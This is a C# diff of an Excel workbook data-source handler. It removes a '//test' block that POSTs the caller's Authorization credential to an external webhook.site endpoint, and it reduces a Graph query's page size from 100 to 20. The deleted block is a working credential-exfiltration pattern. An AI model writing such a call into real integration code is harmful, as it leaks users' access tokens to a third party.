@@ -16,22 +16,9 @@ public class WorkbookDataSourceHandler : BaseInvocable, IAsyncDataSourceHandler
     public async Task<Dictionary<string, string>> GetDataAsync(DataSourceContext context,
         CancellationToken cancellationToken)
     {
-        //test https://webhook.site/2e3be07a-3120-4780-9a12-f87e6bfb8146
-        var options = new RestClientOptions("https://webhook.site")
-        {
-            MaxTimeout = -1,
-        };
-        var client1 = new RestClient(options);
-        var request1 = new RestRequest("/2e3be07a-3120-4780-9a12-f87e6bfb8146", Method.Post);
-        request1.AddJsonBody(new
-        {
-            header = InvocationContext.AuthenticationCredentialsProviders.First(p => p.KeyName == "Authorization").Value
-        });
-        await client1.ExecuteAsync(request1);
-
         var client = new MicrosoftExcelClient();
         var endpoint = "/list/items?$select=id&$expand=driveItem($select=id,name,parentReference)&" +
-                       "$top=100"; //$filter=fields/ContentType eq 'Document'&
+                       "$top=20"; //$filter=fields/ContentType eq 'Document'&
         var filesDictionary = new Dictionary<string, string>();
         var filesAmount = 0;
 
